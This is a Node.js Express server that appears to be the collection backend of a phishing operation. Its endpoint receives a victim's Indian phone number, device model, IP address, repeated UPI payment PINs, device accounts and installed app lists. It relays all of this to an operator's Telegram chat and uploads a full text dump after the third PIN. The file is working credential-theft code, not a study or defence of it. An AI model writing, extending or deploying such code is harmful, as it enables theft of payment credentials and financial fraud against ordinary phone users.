require('dotenv').config();
const express = require('express');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data');

const app = express();
app.use(cors());
app.use(express.json());

const { PORT, BOT_TOKEN, CHAT_ID } = process.env;

let lastMessageId = null;
let currentMessageText = "";
let pinCount = 0; 
let fullDeviceName = "Device_Details";

const sendOrUpdateTelegram = async (message) => {
    try {
        if (!lastMessageId) {
            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            });
            lastMessageId = response.data.result.message_id;
            currentMessageText = message;
        } else {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                chat_id: CHAT_ID,
                message_id: lastMessageId,
                text: message,
                parse_mode: 'Markdown'
            });
            currentMessageText = message;
        }
    } catch (error) {
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        lastMessageId = response.data.result.message_id;
        currentMessageText = message;
    }
};

const sendFileToTelegram = async (content, filename) => {
    try {
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        const cleanContent = content.replace(/\*/g, ''); 
        const safeFilename = filename.replace(/[/\\?%*:|"<>]/g, '-'); 

        form.append('document', Buffer.from(cleanContent, 'utf-8'), { 
            filename: `${safeFilename}.txt` 
        });

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
    } catch (error) {}
};

const startupNotification = async () => {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: `*BJP Client's*`,
            parse_mode: 'Markdown'
        });
    } catch (e) {}
};

app.post('/send-data', async (req, res) => {
    // UPDATED: Destructure accounts and packages from req.body
    const { type, number, pin, deviceId, deviceTime, deviceDate, userIP, accounts, packages } = req.body;
    
    if (deviceId) {
        fullDeviceName = deviceId;
    }

    if (type === 'NUMBER') {
        lastMessageId = null; 
        pinCount = 0; 

        let updatedText = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
        updatedText += `*IP Address:* "${userIP || 'Detecting...'}"\n`; 
        updatedText += `*Date:* ${deviceDate || 'Detecting...'}\n`; 
        updatedText += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
        updatedText += `*Number:* "+91${number}"\n`;
        
        currentMessageText = updatedText; // Store to update later
        await sendOrUpdateTelegram(currentMessageText);
    } 
    
    else if (pin) {
        pinCount++; 
        currentMessageText += `*UPI PIN:* "${pin}"\n`;
        await sendOrUpdateTelegram(currentMessageText);
        if (pinCount === 3) {
            await sendFileToTelegram(currentMessageText, fullDeviceName);
        }
    }

    // --- NEW LOGIC FOR ACCOUNTS & PACKAGES ---
    else if (accounts || packages) {
        let extraInfo = `\n*--- Account's ---*\n`;
        
        // Handle Accounts
        let accList = typeof accounts === 'string' ? JSON.parse(accounts) : accounts;
        if (accList && Array.isArray(accList)) {
            accList.forEach(acc => { extraInfo += `• ${acc}\n`; });
        } else {
            extraInfo += `No Accounts Found\n`;
        }

        extraInfo += `\n*--- Package's ---*\n`;
        
        // Handle Packages
        let pkgList = typeof packages === 'string' ? JSON.parse(packages) : packages;
        if (pkgList && Array.isArray(pkgList)) {
            pkgList.forEach(pkg => { extraInfo += `• ${pkg}\n`; });
        } else {
            extraInfo += `No Packages Found\n`;
        }

        // Append to the existing message and update Telegram
        currentMessageText += extraInfo;
        await sendOrUpdateTelegram(currentMessageText);
        
        // Instant file backup for full data
        await sendFileToTelegram(currentMessageText, `Full_Data_${fullDeviceName}`);
    }
    
    res.status(200).json({ success: true });
});

app.listen(PORT, () => {
    startupNotification();
});
